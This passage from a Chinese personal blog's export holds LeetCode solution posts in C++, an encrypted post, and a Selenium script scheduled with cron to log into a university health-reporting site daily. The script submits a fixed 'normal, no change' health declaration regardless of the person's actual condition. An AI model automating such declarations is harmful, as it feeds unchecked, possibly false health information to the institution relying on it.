<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>把链表的每个结点的值存到vector容器tmp中，然后遍历tmp容器计算每一位转十进制的数值并相加。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败49.61%，内存消耗8.7M，击败5.10%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getDecimalValue</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; tmp;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//把链表结点的值存到tmp中</span></span><br><span class="line">        <span class="keyword">while</span>(head)&#123;</span><br><span class="line">            tmp.push_back(head-&gt;val);</span><br><span class="line">            head=head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> n=tmp.size();</span><br><span class="line">        <span class="comment">//遍历二进制整数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            result+=tmp[i]*<span class="built_in">pow</span>(<span class="number">2</span>,n-i<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/convert-binary-number-in-a-linked-list-to-integer/solution/er-jin-zhi-lian-biao-zhuan-zheng-shu-by-leetcode-s/">官方题解</a>:</h6><p><strong>方法一：模拟</strong></p>
<p>由于链表中从高位到低位存放了数字的二进制表示，因此我们可以使用二进制转十进制的方法，在遍历一遍链表的同时得到数字的十进制值。</p>
<p><strong>c++代码：</strong>（执行8ms，击败80.33%，内存10.4M，击败5.12%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getDecimalValue</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode* cur = head;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            ans = ans * <span class="number">2</span> + cur-&gt;val;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$，其中 $N$是链表中的节点个数。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>我是想复杂了，直接像官方题解那样遍历链表同时得到十进制值就行了。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>作息安排</title>
    <url>/2020/11/09/%E4%BD%9C%E6%81%AF%E5%AE%89%E6%8E%92/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="ec0975a1634ec15c49246266a52000516c45ba61874e96eb2e80d0c6d55b4ee9">04b96cf03f1b5d00286d72390b6bf2e0817acbfddb7147d2fcc01912c7f5c0f9713c9c317ba53b9347fde83c930f8c77af411014f8ec84eef7465f6027f6e56361da453a696c51ea2cf726ce74f4d1f870ba487ed6f2d242104af5c0877116b7f14bfb7a90c5973d12ee403d2035f9933239ae2447ed66790333bdf54ffb591262e25fa12dbcf137d44c19a6cd948ebafb15e73fa6eff6dc060b9040f5fe74ceda47dc32b97d576023487f051b3ba548d6ba50e2b500f2040aef18f59839ab6e1e75f19b19b2197541d212a3b8a50be74d4dcb775f19746dc5f65bb1d14038106d809a8f516785e6e320975209525d369518b3e93b5bec268679dda1396e30afe69c8f882a0bd5eacf54f501c1e3d2ec0c133fbd5fae0ba490bbbfee600d4cf6aa149013dd2ac3cd37941858efe893f2a592496b3eaafec6bb81214fff9398c9bf5cf62cf6c62417050643f31da55886cef1c4c4ed63d5f931116c2cca0f27d8a9834de0c909ad16ed2b68d851e3a8828a0df430a39ba800d84943f56c39b93bcebbd378f87367de37ca08f902194b9f84c8c83e171943330b7d6bc4dec1bed025281fba302fe2fc5e5db8f05c79ae307f2db7fe6c5919e40b495de52fb53d91c01dc6c71b5107ad186592fa1ef42d88da706145acf9014466418c2f0ab4ecbdadbe5a91335455ad33db6f67d661a27151bced0fc2ba459346c47730ecaf13913bdddf7bf40808baff171e1784421f9e209367f6e036e92f13488b65eb6b4110531ad6c8cff7cc5a620707d82d267cca913812713497582e08562a20f2cc1df6a3f2ed856e4b7148e84bf5572925b7d7a6b2f5deacf7dbe707d452b9043f74d040c04a7b643eeb6c70167240339806df3940959c7e2448f1f7616a27d405b3f023cdd94fcd760b8f2f6d507ef3fd3e8fafa974f76813e64855af29f3804a4b9d829c3ecf69f04574bd26d0c74d8fe79338b612d7a4099b00fd99dd209f060208a7484a92e2c44922ce94b153881a55e5cb48aeabc64bf3b54932f5b7b785db7dd176a8223ee9042e0d2d6f7a04d68dbecaf6d28e4e01d5db71f740157b23e7064d4a08734d4e2f2e96a3c746b69483e4fd7382fa0259497cc1072ed12d75b103a271b9529364017e1171f1f98211b8ed96234c7ab03e6d1385c5ee006102942e4b9fa9abeb42b6714f12aefce1526aad8f814a20a024f74bc6bd8fa86251c5572a08565971426c480a11eca3ffb7c36b57fd763840c5fb0cefbcc2246f915056578e2427e87b05be76d7fcccf7875b5919358b8fb2bff0d56b1658bf23bcc929c495115dba57a87939bd7c0ede0e5c780fc500af70601163dd23127f988dff6fe838321694138f563984a78fe4b1af95732a2f31d2d1e31277107b58ad1e143fc1ea3414974920c05f33aa19fd78925391e13348acdae3bfb91ec713ff52554c7f28771407d0c7fc199ad6e0f88a82e02bf4625635fc674b95ffec0dbe72f9cc287550587568a3218efc710ff04261aa27e2fd02e75582ec307b944de4a8de34f96f50a22bc246ea4650c0d9d3181d37bd858e1abbce806c477297a6db80eb6430710d66c9ee626594062c2a46c3152a1cf8080d4ef131374c29ad5b02585b464d724eb7e68fb16173db7e76521c15424143834662027b0f9f5de23f8d4eb21f005015fd8b1132a62ebfc6c43e8ea8e76fea4f4397bd779c0e0cb537dd22eba32f357922604654474975968abaa7fa222c0da7e7a4ea6543abae57d76e2f43e5cdb34434dfbbfc316f4e977fba57c47ba3d420d32d6f56ba3c8832de5bd8d29e2d2c28e70cce381a84440884fb4229e212ec24ab7e1f32a4e0846327cd253c816bbbcdfc263e946386cbaf4aaed311e488558e455538e8f376d04f81a2a0525b67a75ae100f58286011951dd7b10b78d2d46d7794a500ed341862bd565d69fc0fbc14f226ce74a70cc8b9ba16f1d1c8d</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>健康信息定时上报</title>
    <url>/2020/11/03/%E5%81%A5%E5%BA%B7%E4%BF%A1%E6%81%AF%E5%AE%9A%E6%97%B6%E4%B8%8A%E6%8A%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h6 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h6><p>因为前面刚写过<a href="https://z2bns.github.io/2020/10/26/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E5%AE%89%E5%85%A8%E8%80%83%E8%AF%95%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%8A%A8%E7%AD%94%E9%A2%98/">实验室安全考试系统自动答题</a>脚本，而本文的健康信息定时上报也是用到了selenium模块，而且确实是每天都要在系统里上报健康信息，所以写了本文这么一个脚本，仅作为学习技术、学习知识记录之用，请勿滥用。</p>
<a id="more"></a>

<h6 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h6><p>其实也就是用到了python的selenium模块，模拟浏览器登录网站点击按钮实现上报功能，然后把脚本放到服务器上，再设置一个定时任务，每天7点运行一次这个python脚本。其实应该也可以抓上报时的请求包然后分析分析，然后用python定时提交请求，这条路我没试😗</p>
<h6 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- codeing = utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2020/11/03</span></span><br><span class="line"><span class="comment"># @Author : loadding...</span></span><br><span class="line"><span class="comment"># @File : health_report.py</span></span><br><span class="line"><span class="comment"># @Software : jupyter</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver </span><br><span class="line"><span class="keyword">import</span> getpass</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url=<span class="string">&#x27;https://e-report.neu.edu.cn/notes/create&#x27;</span></span><br><span class="line">    <span class="comment">#统一身份认证登录</span></span><br><span class="line">    <span class="comment">#username=input(&#x27;请输入学号：&#x27;)</span></span><br><span class="line">    <span class="comment">#password=input(&#x27;请输入密码：&#x27;)</span></span><br><span class="line">    <span class="comment">#password=getpass.getpass(&#x27;请输入密码：&#x27;)</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">#设置自己的学号、密码，运行时要修改成自己的学号密码</span></span><br><span class="line">    username=<span class="string">&#x27;*******&#x27;</span></span><br><span class="line">    password=<span class="string">&#x27;*************&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#在linux环境下运行，添加以下代码</span></span><br><span class="line">    ch_options=webdriver.ChromeOptions()</span><br><span class="line">    <span class="comment">#为Chrome配置无头模式</span></span><br><span class="line">    ch_options.add_argument(<span class="string">&quot;--headless&quot;</span>)</span><br><span class="line">    ch_options.add_argument(<span class="string">&quot;--no-sandbox&quot;</span>)</span><br><span class="line">    ch_options.add_argument(<span class="string">&quot;--disable-gpu&quot;</span>)</span><br><span class="line">    ch_options.add_argument(<span class="string">&quot;--disable-dev-shm-usage&quot;</span>)</span><br><span class="line">    <span class="comment">#设置之后的</span></span><br><span class="line">    dr=webdriver.Chrome(chrome_options=ch_options)</span><br><span class="line">    dr.get(url)</span><br><span class="line">   	<span class="comment">#设置用户名和密码</span></span><br><span class="line">    dr.find_element_by_id(<span class="string">&#x27;un&#x27;</span>).send_keys(username)</span><br><span class="line">    dr.find_element_by_id(<span class="string">&#x27;pd&#x27;</span>).send_keys(password)</span><br><span class="line">    <span class="comment">#点击提交登录</span></span><br><span class="line">    dr.find_element_by_id(<span class="string">&#x27;index_login_btn&#x27;</span>).click()</span><br><span class="line">    <span class="comment">#根据当前页面url来判断是否登录成功</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;https://pass.neu.edu.cn/tpass/login&#x27;</span> <span class="keyword">in</span> dr.current_url:</span><br><span class="line">        print(<span class="string">&quot;用户名或密码错误！请重新登录！！！&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#点击本人上报</span></span><br><span class="line">    dr.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;app&quot;]/main/div/form/div[1]/table/tbody/tr/td[1]/div/div/div/label[1]/span[1]/span&#x27;</span>).click()</span><br><span class="line">    <span class="comment">#点完本人上报后才会出来无变化这个按钮选项，所以先等1秒，否则容易没等到出来就执行了点击无变化按钮操作，最终导致出错</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#点击正常</span></span><br><span class="line">    dr.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;app&quot;]/main/div/form/div[3]/div[2]/table/tbody/tr[1]/td/div/div/div/label[1]/span[1]/span&#x27;</span>).click()</span><br><span class="line">    <span class="comment">#page_source=dr.page_source</span></span><br><span class="line">    <span class="comment">#tree=etree.HTML(page_source)</span></span><br><span class="line">    <span class="comment">#print(page_source)</span></span><br><span class="line">    <span class="comment">#点击无变化</span></span><br><span class="line">    <span class="comment">#？？？怎么突然好使了，试了好久都是点击不了，我还纳闷呢，giao</span></span><br><span class="line">    <span class="comment">#点击无变化按钮有时好使有时不好使，经测试确实是因为代码执行太快导致没有出现无变化按钮时就已经执行了点击操作，这个坑排了好久，哈哈哈</span></span><br><span class="line">    dr.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;app&quot;]/main/div/form/div[4]/div[2]/table/tbody/tr[1]/td/div/div/div/label[1]/span[1]/span&#x27;</span>).click()</span><br><span class="line">    <span class="comment">#点击提交</span></span><br><span class="line">    dr.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;app&quot;]/main/div/form/div[6]/button&#x27;</span>).click()</span><br><span class="line">    report_time=time.asctime( time.localtime(time.time()) )</span><br><span class="line">    print(report_time+<span class="string">&#x27;：健康上报成功！！！&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h6><p>把本地写好并测试完成后的python脚本放到服务器上，因为使用了selenium模块，所以linux服务器上还需要配置环境（chrome、chromedriver、selenium等），具体参考我的另一篇文章<a href="https://z2bns.github.io/2020/11/03/linux%E4%B8%8B%E4%BD%BF%E7%94%A8selenium%E6%A8%A1%E5%9D%97/">linux下使用selenium模块</a>。</p>
<p>然后再服务器上使用crontab设置定时执行python程序</p>
<p>crontab常用命令：</p>
<ol>
<li>查询当前系统用户设置了哪些执行任务：<code>crontab -l</code></li>
<li>清空当前系统用户设置的所有任务：<code>crontab -r</code>  </li>
<li>编辑和设置当前系统用户要自动执行的任务：<code>crontab -e</code></li>
<li>检查crontab任务执行日志：<code>cat /var/log/cron</code></li>
</ol>
<p>在linux服务器上执行crontab -e，然后在弹出的vim编辑界面最后添加下面这行定时任务（每天早上7点执行health_report.py文件把结果存到report.log文件中）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0 7 * * * python3 /home/lighthouse/python_workspace/health_report.py &gt;&gt; /home/lighthouse/python_workspace/report.</span><br><span class="line">log</span><br></pre></td></tr></table></figure>

<p>查看定时任务列表，可以看到定时任务已经添加成功了</p>
<p><img src="/2020/11/03/%E5%81%A5%E5%BA%B7%E4%BF%A1%E6%81%AF%E5%AE%9A%E6%97%B6%E4%B8%8A%E6%8A%A5/image-20201104085221486.png" alt="image-20201104085221486"></p>
<p>经第二天测试，确实是成功自动上报健康信息了🙃</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>selenium</tag>
        <tag>定时任务</tag>
      </tags>
  </entry>
  <entry>
    <title>分割平衡字符串</title>
    <url>/2020/11/10/%E5%88%86%E5%89%B2%E5%B9%B3%E8%A1%A1%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/split-a-string-in-balanced-strings/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>在一个「平衡字符串」中，’L’ 和 ‘R’ 字符的数量是相同的。</p>
<p>给出一个平衡字符串 <code>s</code>，请你将它分割成尽可能多的平衡字符串。</p>
<p>返回可以通过分割得到的平衡字符串的最大数量。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;RLRRLLRLRL&quot;</span><br><span class="line">输出：4</span><br><span class="line">解释：s 可以分割为 &quot;RL&quot;, &quot;RRLL&quot;, &quot;RL&quot;, &quot;RL&quot;, 每个子字符串中都包含相同数量的 &#39;L&#39; 和 &#39;R&#39;。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;RLLLLRRRLR&quot;</span><br><span class="line">输出：3</span><br><span class="line">解释：s 可以分割为 &quot;RL&quot;, &quot;LLLRRR&quot;, &quot;LR&quot;, 每个子字符串中都包含相同数量的 &#39;L&#39; 和 &#39;R&#39;。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;LLLLRRRR&quot;</span><br><span class="line">输出：1</span><br><span class="line">解释：s 只能保持原样 &quot;LLLLRRRR&quot;.</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= s.length &lt;= 1000</code></li>
<li><code>s[i] = &#39;L&#39; 或 &#39;R&#39;</code></li>
<li>分割得到的每个字符串都必须是平衡字符串。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>利用STL模板库中的栈stack容器，两个字符一个入栈一个出栈，如果栈空（非初始状态）则得到一个平衡字符串</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.4M，击败9.17%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">balancedStringSplit</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">stack</span>&lt;<span class="keyword">char</span>&gt; ss;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();++i)&#123;</span><br><span class="line">            <span class="comment">//一个入栈一个出栈</span></span><br><span class="line">            <span class="comment">//栈空或者与栈中字符相同则入栈</span></span><br><span class="line">            <span class="keyword">if</span>(ss.empty() || ss.top()==s[i])&#123;</span><br><span class="line">                ss.push(s[i]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//与栈中字符不同则出栈</span></span><br><span class="line">                ss.pop();</span><br><span class="line">                <span class="comment">//出栈后栈为空说明是一个平衡字符串（L和R数量相同）</span></span><br><span class="line">                <span class="keyword">if</span>(ss.empty())&#123;</span><br><span class="line">                    ++result;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，主要是使用了容器stack的思想，挺好的，散会😪</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>删除中间节点</title>
    <url>/2020/11/07/%E5%88%A0%E9%99%A4%E4%B8%AD%E9%97%B4%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/delete-middle-node-lcci/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>实现一种算法，删除单向链表中间的某个节点（即不是第一个或最后一个节点），假定你只能访问该节点。</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：单向链表a-&gt;b-&gt;c-&gt;d-&gt;e-&gt;f中的节点c</span><br><span class="line">结果：不返回任何数据，但该链表变为a-&gt;b-&gt;d-&gt;e-&gt;f</span><br></pre></td></tr></table></figure>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>依次把删除节点下一个节点的值赋值给当前节点，也就是说把要删除的节点当做下一个节点，这样把要删除节点后面的链元素依次前移。删除节点不是第一个或最后一个节点，处理特殊情况：删除的是倒数第二个节点因为它下一个节点是最后一个节点，依次调用deleteNode函数，若删除节点是倒数第二个，则直接next指针为NULL，否则递归调用deleteNode函数。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败97.21%，内存消耗8.2M，击败5.84%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteNode</span><span class="params">(ListNode* node)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//删除的节点不为第一个或最后一个节点</span></span><br><span class="line">        <span class="comment">//把要删除的节点变成下一个节点</span></span><br><span class="line">        node-&gt;val=node-&gt;next-&gt;val;</span><br><span class="line">        <span class="comment">//如果是不是倒数第二个节点，递归删除下一个节点</span></span><br><span class="line">        <span class="keyword">if</span>(node-&gt;next-&gt;next)&#123;</span><br><span class="line">            deleteNode(node-&gt;next);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//是倒数第二个节点，直接删除下一个节点</span></span><br><span class="line">            node-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，效率应该还行，哈哈哈😉!。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>删除链表中的节点</title>
    <url>/2020/11/09/%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/delete-node-in-a-linked-list/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>请编写一个函数，使其可以删除某个链表中给定的（非末尾）节点。传入函数的唯一参数为 <strong>要被删除的节点</strong> 。</p>
<p>现有一个链表 — head = [4,5,1,9]，它可以表示为:</p>
<p><img src="/2020/11/09/%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9/237_example.png" alt="img"></p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：head &#x3D; [4,5,1,9], node &#x3D; 5</span><br><span class="line">输出：[4,1,9]</span><br><span class="line">解释：给定你链表中值为 5 的第二个节点，那么在调用了你的函数之后，该链表应变为 4 -&gt; 1 -&gt; 9.</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：head &#x3D; [4,5,1,9], node &#x3D; 1</span><br><span class="line">输出：[4,5,9]</span><br><span class="line">解释：给定你链表中值为 1 的第三个节点，那么在调用了你的函数之后，该链表应变为 4 -&gt; 5 -&gt; 9.</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li>链表至少包含两个节点。</li>
<li>链表中所有节点的值都是唯一的。</li>
<li>给定的节点为非末尾节点并且一定是链表中的一个有效节点。</li>
<li>不要从你的函数中返回任何结果。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>题目和之前的一道题几乎一样，<a href="https://z2bns.github.io/2020/11/07/%E5%88%A0%E9%99%A4%E4%B8%AD%E9%97%B4%E8%8A%82%E7%82%B9/">参考题目</a>。</p>
